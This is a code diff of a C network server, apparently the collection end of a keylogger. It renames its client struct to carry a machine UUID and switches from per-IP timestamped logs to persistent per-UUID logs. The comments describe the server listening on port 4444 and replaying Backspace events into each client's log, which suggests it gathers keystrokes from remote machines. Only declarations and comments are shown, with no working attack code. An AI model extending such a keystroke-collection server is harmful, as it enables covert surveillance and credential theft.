@@ -11,7 +11,6 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <pthread.h>
-#include <time.h>
 
 #define SERVER_PORT 4444           // Port to listen on for incoming connections
 #define BUFFER_SIZE 1024           // Buffer size for receiving network data
@@ -19,25 +18,24 @@
 #define PROGRAM_FAILURE 1          // Standard failure exit code
 #define LOG_DIR "client_logs"      // Directory to store log files
 
-
 /**
- * @brief Structure containing client connection information.
+ * @brief Structure containing client connection information, updated to hold UUID metadata.
  * 
- * This structure is used to package the client's socket file descriptor 
- * and IP address so they can be safely passed to a dedicated handler thread 
- * upon a successful connection.
+ * This structure packages the client's socket file descriptor, IP address, 
+ * and unique machine identifier (UUID) for safe concurrent handling in threads.
  */
 typedef struct {
     int socket_fd;
     char ip_address[INET_ADDRSTRLEN];
-} ClientData;
+    char uuid[64]; 
+} ExtendedClientData;
 
 /**
- * @brief Creates a new log file with a timestamped filename, including the client IP.
- * @param client_ip The IP address of the connected client.
- * @return FILE pointer to the created log file, or NULL on error.
+ * @brief Creates or opens a persistent log file based strictly on the client's unique UUID.
+ * @param uuid The unique identifier string provided by the client during handshake.
+ * @return FILE pointer to the opened/created log file, or NULL on error.
  */
-FILE* create_client_log_file(const char* client_ip);
+FILE* get_or_create_uuid_log(const char* uuid);
 
 /**
  * @brief Handles Backspace events by truncating the last written char in the log.
@@ -47,7 +45,7 @@ void handle_backspace(FILE *log_file);
 
 /**
  * @brief Thread function to handle incoming data from a specific client.
- * @param arg Pointer to the ClientData structure.
+ * @param arg Pointer to the ExtendedClientData structure.
  * @return NULL upon thread termination.
  */
 void *handle_client(void *arg);
